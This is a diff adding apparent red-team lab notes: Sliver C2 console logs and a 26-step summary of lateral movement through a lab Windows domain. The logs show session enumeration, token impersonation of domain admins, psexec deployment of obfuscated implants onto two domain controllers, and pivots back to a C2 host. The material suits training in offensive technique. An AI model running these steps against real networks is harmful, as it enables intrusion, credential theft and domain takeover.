@@ -1,0 +1,567 @@
+ -ipconfig
+ Connection-specific DNS Suffix  . : proce.internal
+   Link-local IPv6 Address . . . . . : fe80::127:b5b1:481c:2cb2%5
+   IPv4 Address. . . . . . . . . . . : 10.64.198.11
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.64.198.1
+
+
+net localgroup
+
+Aliases for \\MWESTEN
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+sa-ipconfig
+
+[*] Successfully executed sa-ipconfig (coff-loader)
+[*] Got output:
+{66E885B7-C84D-44AB-ABCC-EB75A325349B}
+	Ethernet
+	vmxnet3 Ethernet Adapter
+	00-50-56-AE-B5-13
+	10.64.198.11
+Hostname: 	MWesten
+DNS Suffix: 	proce.internal
+DNS Server: 	10.64.135.5
+
+PROCE\mwesten	S-1-5-21-222810365-3841281171-1259173206-1113
+
+sa-whoami
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+PROCE\Domain Users                                Group                    S-1-5-21-222810365-3841281171-1259173206-513  Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+PROCE\Workstation Admins                          Group                    S-1-5-21-222810365-3841281171-1259173206-1107 Mandatory group, Enabled by default, Enabled group, 
+PROCE\Executives                                  Group                    S-1-5-21-222810365-3841281171-1259173206-1106 Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeShutdownPrivilege           Shut down the system                              Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeUndockPrivilege             Remove computer from docking station              Disabled                      
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
+SeTimeZonePrivilege           Change the time zone                              Disabled 
+
+
+
+
+PS C:\Program Files (x86)\Internet Explorer\SIGNUP> cat install.ins
+cat install.ins
+[Branding]
+CompanyName=Microsoft Corporation
+Wizard_Version=11.00.19041.1
+Version=11,00,19041,1
+Custom_Key=MICROSO
+Global=1
+IE4 Welcome Msg=1
+Platform=2
+GUID={7211FFE6-C149-11D0-AFF0-00AA003758BB}
+Type=0
+NoClear=1
+
+
+
+sa-get-netsession
+
+[*] Successfully executed sa-get-netsession (coff-loader)
+[*] Got output:
+
+Client: \\10.64.198.16
+User:   SAXE$
+Active: 63516
+Idle:   2
+--------------------
+
+Client: \\10.64.198.17
+User:   FGLENANNE$
+Active: 63485
+Idle:   4
+--------------------
+
+Client: \\10.64.198.12
+User:   GNUHCL$
+Active: 62488
+Idle:   1
+--------------------
+
+Client: \\10.64.198.14
+User:   SESCHER$
+Active: 57699
+Idle:   56
+--------------------
+
+Client: \\10.64.198.19
+User:   TBRENNAN$
+Active: 56994
+Idle:   57
+--------------------
+
+Client: \\10.64.198.10
+User:   VANDERSON$
+Active: 56793
+Idle:   56
+--------------------
+
+Client: \\10.64.135.5
+User:   PROCE-DC$
+Active: 43441
+Idle:   16
+--------------------
+
+Client: \\[fe80::127:b5b1:481c:2cb2]
+User:   mwesten
+Active: 40827
+Idle:   3503
+--------------------
+
+
+
+
+ls //10.64.198.14/C$/Users/sescher/Downloads
+
+\\10.64.198.14\C$\Users\sescher\Downloads (2 items, 5.0 MiB)
+============================================================
+-rw-rw-rw-  desktop.ini  282 B    Wed Jun 21 18:14:13 +0100 2023
+-rw-rw-rw-  quagga       5.0 MiB  Thu Jun 22 16:38:39 +0100 2023
+
+
+sa-get-netsession
+
+[*] Successfully executed sa-get-netsession (coff-loader)
+[*] Got output:
+
+Client: \\10.64.198.12
+User:   GNUHCL$
+Active: 65817
+Idle:   4691
+--------------------
+
+sliver (mormalan) > impersonate PROCE\\gnuhcl
+
+[*] Successfully impersonated PROCE\gnuhcl
+
+sliver (mormalan) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: PROCE\gnuhcl
+
+
+PS C:\Users\gnuhcl> net localgroup
+net localgroup
+
+Aliases for \\GNUHCL
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+
+S C:\Users\gnuhcl> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : proce.internal
+   Link-local IPv6 Address . . . . . : fe80::9cbe:ba3c:a40f:f74c%5
+   IPv4 Address. . . . . . . . . . . : 10.64.198.12
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.64.198.1
+PS C:\Users\gnuhcl> 
+
+
+generate -f service -N vmexplore --tcp-pivot 10.64.198.12:9610
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m4s
+[*] Implant saved to /tmp/vmexplore.exe
+
+
+
+psexec -c vmexplore.exe 10.64.135.5
+
+⚠️  You're going to deploy the following service:
+- Name: Sliver
+- Description: Sliver implant
+⚠️  You might want to change that before going further...
+? This action is bad OPSEC, are you an adult? Yes
+[*] Uploaded service binary to \\10.64.135.5\C$\windows\temp\r____ngt0.exe
+[*] Waiting a bit for the file to be analyzed ...
+[*] Successfully started service on 10.64.135.5 (c:\windows\temp\r____ngt0.exe)
+[*] Successfully removed service Sliver on 10.64.135.5
+
+[*] Session 172f49cd vmexplore - 10.61.61.75:52601->INDIAN_CROTCH->mormalan-> (PROCE-DC) - windows/amd64 - Sat, 08 Jul 2023 17:14:06 UTC
+
+
+
+whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: NT AUTHORITY\SYSTEM
+sliver (vmexplore) > sa-get-netsession
+
+[*] Successfully executed sa-get-netsession (coff-loader)
+[*] Got output:
+
+Client: \\10.64.135.5
+User:   PROCE-DC$
+Active: 65464
+Idle:   205
+--------------------
+
+Client: \\10.64.198.19
+User:   tbrennan
+Active: 3
+Idle:   3
+--------------------
+
+Client: \\10.64.193.5
+User:   PROCE-OPS-DC$
+Active: 50993
+Idle:   2
+--------------------
+
+
+
+impersonate PROCE\\Administrator
+
+[*] Successfully impersonated PROCE\Administrator
+
+sliver (vmexplore) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: PROCE\Administrator
+sliver (vmexplore) > sa-get-netsession
+
+[*] Successfully executed sa-get-netsession (coff-loader)
+[*] Got output:
+
+Client: \\10.64.135.5
+User:   PROCE-DC$
+Active: 66483
+Idle:   150
+--------------------
+
+Client: \\10.64.193.5
+User:   PROCE-OPS-DC$
+Active: 52012
+Idle:   1
+--------------------
+
+
+
+ls //10.64.135.5/C$
+
+\\10.64.135.5\C$\ (12 items, 1.4 GiB)
+=====================================
+drwxrwxrwx  $Recycle.Bin                        <dir>    Wed Jun 21 17:54:22 +0100 2023
+Lrw-rw-rw-  Documents and Settings -> C:\Users  0 B      Mon May 09 22:31:28 +0100 2022
+-rw-rw-rw-  pagefile.sys                        1.4 GiB  Thu Jun 22 17:48:51 +0100 2023
+drwxrwxrwx  PerfLogs                            <dir>    Sat Sep 15 08:19:00 +0100 2018
+drwxrwxrwx  proce_share                         <dir>    Thu Jun 22 16:30:37 +0100 2023
+dr-xr-xr-x  Program Files                       <dir>    Mon May 09 18:34:36 +0100 2022
+drwxrwxrwx  Program Files (x86)                 <dir>    Sat Sep 15 10:06:10 +0100 2018
+drwxrwxrwx  ProgramData                         <dir>    Fri Jul 07 00:25:18 +0100 2023
+drwxrwxrwx  Recovery                            <dir>    Wed Jun 21 16:33:11 +0100 2023
+drwxrwxrwx  System Volume Information           <dir>    Wed Jun 21 17:36:11 +0100 2023
+dr-xr-xr-x  Users                               <dir>    Wed Jun 21 17:49:23 +0100 2023
+drwxrwxrwx  Windows                             <dir>    Wed Jun 21 17:37:16 +0100 2023
+
+
+sliver (vmexplore) > ls //10.64.135.5/C$/proce_share
+
+\\10.64.135.5\C$\proce_share (1 item, 3.0 MiB)
+==============================================
+-rw-rw-rw-  ZEBRA  3.0 MiB  Thu Jun 22 16:30:37 +0100 2023
+
+
+
+generate -f service -N vmexp --tcp-pivot 10.64.135.5:9610
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] attacker1 left the game
+
+[*] attacker1 has joined the game
+
+[*] Build completed in 2m12s
+[*] Implant saved to /tmp/vmexp.exe
+
+[*] Session 2eb9c7fe request_handler - 10.61.61.75:52601->INDIAN_CROTCH->mormalan->vmexplore-> (PROCE-OPS-DC) - windows/amd64 - Sat, 08 Jul 2023 17:50:51 UTC
+
+
+
+psexec -c vmexp.exe 10.64.193.5
+
+⚠️  You're going to deploy the following service:
+- Name: Sliver
+- Description: Sliver implant
+⚠️  You might want to change that before going further...
+? This action is bad OPSEC, are you an adult? Yes
+[*] Uploaded service binary to \\10.64.193.5\C$\windows\temp\n____np0qc.exe
+[*] Waiting a bit for the file to be analyzed ...
+[*] Successfully started service on 10.64.193.5 (c:\windows\temp\n____np0qc.exe)
+[*] Successfully removed service Sliver on 10.64.193.5
+
+[*] Session 14aa8a72 vmexp - 10.61.61.75:52601->INDIAN_CROTCH->mormalan->vmexplore-> (PROCE-OPS-DC) - windows/amd64 - Sat, 08 Jul 2023 17:54:42 UTC
+
+
+
+ sessions
+
+ ID         Transport   Remote Address                                            Hostname       Username              Operating System   Health  
+========== =========== ========================================================= ============== ===================== ================== =========
+ 14aa8a72   pivot       10.61.61.75:52601->INDIAN_CROTCH->mormalan->vmexplore->   PROCE-OPS-DC   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
+ 2c6dbdf3   http(s)     10.61.61.75:56634                                         MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ 2eb9c7fe   pivot       10.61.61.75:52601->INDIAN_CROTCH->mormalan->vmexplore->   PROCE-OPS-DC   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
+ 2eed617b   http(s)     10.61.61.75:52601                                         MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ 5adecc15   http(s)     10.61.61.75:52600                                         MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ 7cafaf75   pivot       10.61.61.75:52601->INDIAN_CROTCH->                        GNuhcl         NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
+ 820789c3   http(s)     10.61.61.75:52595                                         MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ 8219a0b4   pivot       10.61.61.75:52601->INDIAN_CROTCH->                        MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ 90803870   http(s)     10.61.61.75:52599                                         MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ ca64744e   pivot       10.61.61.75:52601->INDIAN_CROTCH->                        SEscher        NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
+ e0054270   http(s)     10.61.61.75:55121                                         MWesten        PROCE\mwesten         windows/amd64      [ALIVE] 
+ 172f49cd   pivot       10.61.61.75:52601->INDIAN_CROTCH->mormalan->              PROCE-DC       NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
+? Select a session or beacon: SESSION  14aa8a72  vmexp            10.61.61.75:52601->INDIAN_CROTCH->mormalan->vmexplore->  PROCE-OPS-DC  NT AUTHORITY\SYSTEM  windows/amd64
+[*] Active session vmexp (14aa8a72-3bc0-49d1-94e8-8123e3430078)
+
+
+
+ps:
+4672   2264   ops\Administrator              x86_64   sihost.exe                                  1       
+
+
+impersonate ops\\Administrator
+
+[*] Successfully impersonated ops\Administrator
+
+sliver (vmexp) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: ops\Administrator
+
+
+sa-ipconfig
+
+[*] Successfully executed sa-ipconfig (coff-loader)
+[*] Got output:
+{D2A4E940-0C84-49B1-BB49-854FBF0AE239}
+	Ethernet
+	vmxnet3 Ethernet Adapter
+	00-50-56-AE-9F-CC
+	10.64.193.5
+Hostname: 	PROCE-OPS-DC
+DNS Suffix: 	ops.proce.internal
+DNS Server: 	127.0.0.1
+		10.64.24.1
+
+
+sliver (vmexp) > ls //10.64.193.5/C$
+
+\\10.64.193.5\C$\ (12 items, 1.4 GiB)
+=====================================
+drwxrwxrwx  $Recycle.Bin                        <dir>    Wed Jun 21 18:23:19 +0100 2023
+Lrw-rw-rw-  Documents and Settings -> C:\Users  0 B      Mon May 09 22:31:28 +0100 2022
+drwxrwxrwx  ops_share                           <dir>    Thu Jun 22 16:53:18 +0100 2023
+-rw-rw-rw-  pagefile.sys                        1.4 GiB  Thu Jun 22 17:39:55 +0100 2023
+drwxrwxrwx  PerfLogs                            <dir>    Sat Sep 15 08:19:00 +0100 2018
+dr-xr-xr-x  Program Files                       <dir>    Mon May 09 18:34:36 +0100 2022
+drwxrwxrwx  Program Files (x86)                 <dir>    Sat Sep 15 10:06:10 +0100 2018
+drwxrwxrwx  ProgramData                         <dir>    Wed Jun 21 18:16:14 +0100 2023
+drwxrwxrwx  Recovery                            <dir>    Wed Jun 21 16:33:03 +0100 2023
+drwxrwxrwx  System Volume Information           <dir>    Wed Jun 21 18:02:20 +0100 2023
+dr-xr-xr-x  Users                               <dir>    Wed Jun 21 18:15:40 +0100 2023
+drwxrwxrwx  Windows                             <dir>    Wed Jun 21 18:03:30 +0100 2023
+
+
+ls //10.64.193.5/C$/ops_share
+
+\\10.64.193.5\C$\ops_share (1 item, 4.0 MiB)
+============================================
+-rw-rw-rw-  CapyBarA  4.0 MiB  Thu Jun 22 16:53:18 +0100 2023
+
+
+
+ls //10.64.24.14/C$/Users
+
+\\10.64.24.14\C$\Users (9 items, 174 B)
+=======================================
+Lrw-rw-rw-  All Users -> C:\ProgramData       0 B    Sat Dec 07 10:30:39 +0100 2019
+drwxrwxrwx  Ansible                           <dir>  Wed Jun 21 18:25:21 +0100 2023
+dr-xr-xr-x  Default                           <dir>  Wed Jun 21 20:35:55 +0100 2023
+Lrw-rw-rw-  Default User -> C:\Users\Default  0 B    Sat Dec 07 10:30:39 +0100 2019
+drwxrwxrwx  defaultuser0                      <dir>  Wed Jun 21 20:35:57 +0100 2023
+-rw-rw-rw-  desktop.ini                       174 B  Sat Dec 07 10:12:42 +0100 2019
+drwxrwxrwx  ops-jporter                       <dir>  Wed Jun 21 18:39:43 +0100 2023
+drwxrwxrwx  proceopsadmin                     <dir>  Thu Jun 22 17:42:13 +0100 2023
+dr-xr-xr-x  Public                            <dir>  Wed Jun 21 13:39:52 +0100 2023
+
+
+ls //10.64.24.14/C$/Users/ops-jporter
+
+
+s //10.64.24.14/C$/Users/ops-jporter/Documents
+
+\\10.64.24.14\C$\Users\ops-jporter\Documents (5 items, 1.0 MiB)
+===============================================================
+-rw-rw-rw-  Ax0lOt1                                       1.0 MiB  Thu Jun 22 17:23:12 +0100 2023
+
+
+
+
+1. logged in as mwesten **
+2. enumerated for groups, IP's, domain names/users, admin privilges, OS info **
+3. get IP for users with sa-get-netsession **
+4. found quagga in users/sescher/downloads **
+5. also found that user gnuhcl is in domain admin group **
+6. create pivot from mwesten (current user) to gnuhcl **
+7. generate exe service which is stored on local system **
+8. run the service on target system (gnuhcl) **
+9. this service generates a new session, so we switch to that session and are now in gnuhcl system **
+10. once on gnuhcl system, use 'ps' to ensure the user is running a process **
+11. use impersonate to steal his credentials **
+12. enumerate system with new credentials, get IPs, domains, users, etc **
+13. because gnuhcl is a system admin, we found PROCE-DC IP's with sa-get-netsession **
+14. use PROCE-DC data to generate and execute another service, gives us a session in the DC **
+15. gives us NT Administrator/System access**
+16. run 'ps' again to see who we can impersonate**
+17. found PROCE\Administrator, impersonate them to enumerate the system **
+18. found zebra file in Administrator files, proce_share **
+19. PROCE-DC also had the IPs for the second domain controller, PROCE-OPS-DC **
+20. use this data to generate and execute another service, giving us a session in OPS-DC **
+21. enumerate, find users, find IPs, etc **
+22. run 'ps' and impersonate again to steal ops\administrator credentials **
+23. can enumerate files with these high integrity credentials **
+24. find capybara in ops_share **
+25. use sa-get-netsession to find users **
+26. use ls again with users' IPs, found axolot in jporter **
+
+
+
+pivots tcp --lport 9898
+
+[*] Started tcp pivot listener :9898 with id 1
+
+[*] Session d4bdc4a5 vmexplore - 10.1.1.101:61513->ligma_updog-> (CORP-WKS1) - windows/amd64 - Thu, 27 Jul 2023 02:17:59 UTC
+
+sliver (ligma_updog) > pivots
+
+ ID   Protocol   Bind Address   Number Of Pivots 
+==== ========== ============== ==================
+  1   TCP        :9898                         1 
+
+
+use
+
+? Select a session or beacon: SESSION  d4bdc4a5  vmexplore     10.1.1.101:61513->ligma_updog->  CORP-WKS1  NT AUTHORITY\SYSTEM  windows/amd64
+[*] Active session vmexplore (d4bdc4a5-598e-477e-9a6d-0f8fc9b9ab25)
+
+sliver (vmexplore) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: NT AUTHORITY\SYSTEM
+sliver (vmexplore) > ls
+
+
+cd Users
+
+[*] C:\Users
+
+sliver (vmexplore) > ls
+
+C:\Users (8 items, 174 B)
+=========================
+drwxrwxrwx  Administrator                     <dir>  Tue Jul 25 21:15:32 +0000 2023
+Lrw-rw-rw-  All Users -> C:\ProgramData       0 B    Sat Sep 15 07:28:48 +0000 2018
+drwxrwxrwx  corpadmin                         <dir>  Tue Jul 25 22:44:57 +0000 2023
+dr-xr-xr-x  Default                           <dir>  Tue Jul 25 21:13:46 +0000 2023
+Lrw-rw-rw-  Default User -> C:\Users\Default  0 B    Sat Sep 15 07:28:48 +0000 2018
+-rw-rw-rw-  desktop.ini                       174 B  Sat Sep 15 07:16:48 +0000 2018
+drwxrwxrwx  MBrandybuck                       <dir>  Tue Jul 25 22:31:33 +0000 2023
+dr-xr-xr-x  Public                            <dir>  Wed Dec 12 07:45:15 +0000 2018
+
+
+sa-ipconfig
+
+[*] Successfully executed sa-ipconfig (coff-loader)
+[*] Got output:
+{8D446C00-D8C5-4A83-97D6-8648C23FF270}
+	Ethernet
+	Amazon Elastic Network Adapter
+	0E-21-9A-CD-4E-9F
+	10.1.1.102
+Hostname: 	CORP-WKS1
+DNS Suffix: 	shire.lab
+DNS Server: 	10.3.1.100
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
